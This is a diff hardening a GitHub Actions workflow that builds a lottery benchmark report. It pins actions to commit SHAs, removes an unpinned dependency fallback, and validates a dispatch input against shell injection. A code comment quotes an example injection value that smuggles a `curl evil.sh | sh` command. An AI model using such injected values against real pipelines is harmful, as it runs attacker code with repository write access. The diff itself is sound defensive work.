@@ -40,10 +40,10 @@ jobs:
     permissions:
       contents: write
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
 
       - name: Install uv
-        uses: astral-sh/setup-uv@v5
+        uses: astral-sh/setup-uv@d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86 # v5
         with:
           enable-cache: true
 
@@ -51,7 +51,9 @@ jobs:
         run: uv python install 3.12
 
       - name: Install dependencies
-        run: uv sync --frozen --group docs || uv sync --group docs
+        # No `|| uv sync` fallback: silently resolving fresh from PyPI on a
+        # lockfile mismatch would defeat the pinning it exists to provide.
+        run: uv sync --frozen --group docs
 
       - name: Lint
         run: uv run ruff check bench scripts tests
@@ -64,10 +66,18 @@ jobs:
           # Keras/TF are noisy and default to grabbing every core; neither helps here.
           TF_CPP_MIN_LOG_LEVEL: "3"
           PYTHONHASHSEED: "0"
+          # Passed through the environment, never interpolated into the shell.
+          # `${{ }}` is substituted by the runner before bash sees the line, so a
+          # dispatch input like `1"; curl evil.sh | sh; #` would execute in a job
+          # that holds contents:write and pushes to main.
+          N_TEST: ${{ github.event.inputs.n_test || '300' }}
         run: |
+          case "$N_TEST" in
+            ''|*[!0-9]*) echo "n_test must be a positive integer, got: $N_TEST" >&2; exit 1 ;;
+          esac
           uv run python scripts/build_report.py \
             --refresh \
-            --n-test "${{ github.event.inputs.n_test || 300 }}" \
+            --n-test "$N_TEST" \
             --out-dir docs
 
       # build_report.py writes docs/benchmark/index.html and docs/results.md;
@@ -77,7 +87,7 @@ jobs:
         run: uv run mkdocs build --strict
 
       - name: Upload Pages artifact
-        uses: actions/upload-pages-artifact@v3
+        uses: actions/upload-pages-artifact@56afc609e74202658d3ffba0e8f6dda462b719fa # v3
         with:
           path: site
 
@@ -88,7 +98,7 @@ jobs:
         run: |
           git config user.name  "github-actions[bot]"
           git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
-          git add input/Orig_IL_lotto.csv input/lotto_IL_filtered.csv
+          git add input/Orig_IL_lotto.csv input/lotto_IL_modern.csv
           if git diff --cached --quiet; then
             echo "No new draws."
           else
@@ -107,4 +117,4 @@ jobs:
       url: ${{ steps.deployment.outputs.page_url }}
     steps:
       - id: deployment
-        uses: actions/deploy-pages@v4
+        uses: actions/deploy-pages@d6db90164ac5ed86f2b6aed7e0febac5b3c0c03e # v4
